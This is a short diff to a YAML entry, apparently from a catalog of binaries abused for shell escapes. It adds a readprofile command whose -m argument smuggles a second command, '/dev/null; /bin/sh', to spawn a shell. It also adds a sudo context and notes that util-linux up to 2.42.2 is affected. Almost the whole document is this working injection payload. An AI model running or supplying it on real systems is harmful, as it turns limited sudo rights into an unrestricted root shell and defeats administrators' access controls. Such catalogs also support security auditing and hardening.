@@ -4,10 +4,10 @@ functions:
   - code: |-
       TMPFILE=$(mktemp)
       echo "_stext" > $TMPFILE
-      TODO
+      readprofile -p $TMPFILE -m '/dev/null; /bin/sh >&2 #.gz
     comment: |-
-      TODO
-      Affects util-linux versions <= 2.42.2.
+      Affects util-linux version <= 2.42.2.
     contexts:
+      sudo:
       unprivileged:
 ...
